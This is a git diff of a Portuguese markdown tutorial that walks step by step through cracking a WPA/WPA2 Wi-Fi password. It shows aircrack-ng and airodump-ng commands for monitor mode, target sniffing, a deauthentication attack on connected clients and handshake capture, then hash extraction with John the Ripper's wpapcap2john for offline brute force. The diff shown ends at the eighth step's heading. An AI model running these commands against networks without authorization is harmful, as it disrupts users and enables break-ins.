@@ -18,8 +18,9 @@ texto original: https://github.com/geleiaa/wirelesssss/blob/main/crackwpa.md
 > 3 - john the ripper
 
 
+>___
 
-_________________________________________________________________________________________________________________________________________________________
+
 # Primeiro passo: 
 ## verificar se seu chipset suporta os modos citados acima.
 
@@ -53,8 +54,8 @@ phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 #### ($ ifconfig ou $ iwconfig para ver o nome do internace)
 
 
+>___
 
-_________________________________________________________________________________________________________________________________________________________
 # Segundo passo:
 ## Colocar sua interface em *monitor mode*
 
@@ -108,8 +109,8 @@ ath0     IEEE 802.11g  ESSID:""
 
 
 
+>___
 
-_________________________________________________________________________________________________________________________________________________________
 # Terceiro passo
 ## "Sniffar" redes em volta com o *airodum-ng* para identificar seu alvo
 
@@ -141,52 +142,49 @@ A saida sera parecida com essa:
 * STATION = Mac Address de dispositivos conectados aos APs
 
  
+>___
+
+# Quarto passo
+## Depois de identificar o alvo, comece a captura dos pacotes da rede alvo, para capturar o HANDSHAKE
+
+#### *$ sudo airodump-ng --bssid (macaddr) -c (canal) -w (nome-arquivo) (interface)*
+
+> --bssid mac address do AP alvo
+>
+> -c seleciona o canal do AP para evitar perda de pacotes
+> 
+> -w para gravar captura em um arquivo .cap
  
  
-_________________________________________________________________________________________________________________________________________________________
- # Quarto passo
- ## Depois de identificar o alvo, comece a captura dos pacotes da rede alvo, para capturar o HANDSHAKE
+>___
+
+# Quinto passo
+## Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP, para ele ser desconectado. Em seguida o dispositivo irá se conectar no AP de novo automaticamente. E é nessa hora que o HANDSHAKE é capturado...
+
+o comando para desautenticar uma STATION de um AP com o aireplay-ng:
+
+#### *$ aireplay-ng -0 1 -a (macAP) -c (macSTATION) (interface)*
+
+> -0 especifica o Deauthentication attack   
+> 1 é o número de deauths a serem enviados  
+> -a mac do AP alvo   
+> -c mac do dispositivo cliente para desautenticar 
+##### Obs: mandar poucos deauths pois pode influênciar na captura do trafego
+
+A saida sera parecida com essa:
+```bash
+12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
+12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
+```
+[ ACKs recebidos da STATION | ACKs recebidos do AP]
  
- #### *$ sudo airodump-ng --bssid (macaddr) -c (canal) -w (nome-arquivo) (interface)*
  
- > --bssid mac address do AP alvo
- >
- > -c seleciona o canal do AP para evitar perda de pacotes
- > 
- > -w para gravar captura em um arquivo .cap
- 
- 
+ >___
 
 
-_________________________________________________________________________________________________________________________________________________________ 
- # Quinto passo
- ## Enquanto o trafego do alvo é capturado, você devera fazer um ataque de Deauthentication em um dispositivo que está conectado ao AP, para ele ser desconectado. Em seguida o dispositivo irá se conectar no AP de novo automaticamente. E é nessa hora que o HANDSHAKE é capturado...
- 
- o comando para desautenticar uma STATION de um AP com o aireplay-ng:
- 
- #### *$ aireplay-ng -0 1 -a (macAP) -c (macSTATION) (interface)*
- 
- > -0 especifica o Deauthentication attack   
- > 1 é o número de deauths a serem enviados  
- > -a mac do AP alvo   
- > -c mac do dispositivo cliente para desautenticar 
-
- ##### Obs: mandar poucos deauths pois pode influênciar na captura do trafego
- 
- A saida sera parecida com essa:
- ```bash
- 12:35:25  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9
- 12:35:25  Sending 64 directed DeAuth. STMAC: [00:0F:B5:AE:CE:9D] [ 61|63 ACKs]
- ```
-
- [ ACKs recebidos da STATION | ACKs recebidos do AP]
- 
- 
- 
-_________________________________________________________________________________________________________________________________________________________
- # Sexto passo
- ## Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando os pacotes irá aparecer o seguinte: *[ WPA handshake: 00:14:6C:7E:40:80*
- Exemplo:
+# Sexto passo
+## Se o Quinto passo for bem sucedido, no terminal do airodump-ng capturando os pacotes irá aparecer o seguinte: *[ WPA handshake: 00:14:6C:7E:40:80*
+Exemplo:
  
 	  CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7E:40:80
                                                                                                             
@@ -197,55 +195,52 @@ ________________________________________________________________________________
           00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP   PSK  teddy 
  
  
- Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual vai ver alguns arquivos incluindo a captura do trafego( arquivo.cap)
- 
+Depois do handshake capturado você já pode encerrar a captura e se você verifcar o diretorio atual vai ver alguns arquivos incluindo a captura do trafego( arquivo.cap)
+
 E depois da captura ser feita, você pode colocar a interface de volta em modo Managed com os comandos:
- 
- 
- #### *$ sudo airmon-ng stop (interface)*  # para o modo monitor
- 
- depois
 
- #### *$ service network-manager start*  # reinicia o gerenciador de rede
- 
- ($ ifconfig ou $ iwconfig para confirmar o modo que a interface esta)
- 
- 
- 
- 
-_________________________________________________________________________________________________________________________________________________________
- # Setimo passo
- ## Você pode verificar se os pacotes de autenticação foram capturados com sucesso abrindo o arquivo .cap no wireshark e filtrando os pacotes EAPOL.  
- 
- (os pacotes m1 até m4 precisam ser capturados)
- 
- mais sobre informações **[aqui](https://community.cisco.com/t5/wireless-mobility-knowledge-base/802-11-sniffer-capture-analysis-wpa-wpa2-with-psk-or-eap/ta-p/3116990)** ...
- 
- 
- Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta WPAPCAP2JOHN do pacote John The Ripper.
- 
- #### *$ wpapcap2john -v arquivo.cap*
- 
- o comando acima vai analizar o .cap procurando pelo handshake
- 
- (colocar exemplo da saida do comando)
- 
- Se o handshake foi capturado corretamente a ferramenta wpapcap2john pode converter um hash da autenticação capturada no arquivo .cap, para ser feito um ataque de brute-force offline... com o seguinte comando:
+
+#### *$ sudo airmon-ng stop (interface)*  # para o modo monitor
+
+depois
+#### *$ service network-manager start*  # reinicia o gerenciador de rede
+
+($ ifconfig ou $ iwconfig para confirmar o modo que a interface esta)
 
  
- #### *$ wpapcap2john > (arquivo de saida)*
+>___
+
+
+# Setimo passo
+## Você pode verificar se os pacotes de autenticação foram capturados com sucesso abrindo o arquivo .cap no wireshark e filtrando os pacotes EAPOL.  
+
+(os pacotes m1 até m4 precisam ser capturados)
+
+mais sobre informações **[aqui](https://community.cisco.com/t5/wireless-mobility-knowledge-base/802-11-sniffer-capture-analysis-wpa-wpa2-with-psk-or-eap/ta-p/3116990)** ...
+
+
+Depois do HANDSHAKE capturado há algumas formas de extrair só a parte que interessa. Uma delas é com uma ferramenta WPAPCAP2JOHN do pacote John The Ripper.
+
+#### *$ wpapcap2john -v arquivo.cap*
+
+o comando acima vai analizar o .cap procurando pelo handshake
+
+(colocar exemplo da saida do comando)
+
+Se o handshake foi capturado corretamente a ferramenta wpapcap2john pode converter um hash da autenticação capturada no arquivo .cap, para ser feito um ataque de brute-force offline... com o seguinte comando:
+
+#### *$ wpapcap2john > (arquivo de saida)*
  
 No arquivo ficara um hash parecido com isso: 
 
-```bash 
+```bash
 ESSID:$WPAPSK$ESSID#x3EU5Y3o1jRkE5hTM0qamIqSFyApa7cBSX5AZFNCidtAkKPdtQ1uyW2Hv1z8s4BrRP7aFIZy19Jsvy9hMhX5O8FRp2P1UaDjQ8MpZE21.5I0.Ec................wzRUT2
 b9IE63q1mc:0ef770407b5f:f454201e4174:f454201e4174::WPA2, verified:arquivo.cap
 ``` 
 
+>___
 
 
-
-_________________________________________________________________________________________________________________________________________________________
 # Oitavo passo 
 ## (não pensei que teria tantos passos :) ) 
 
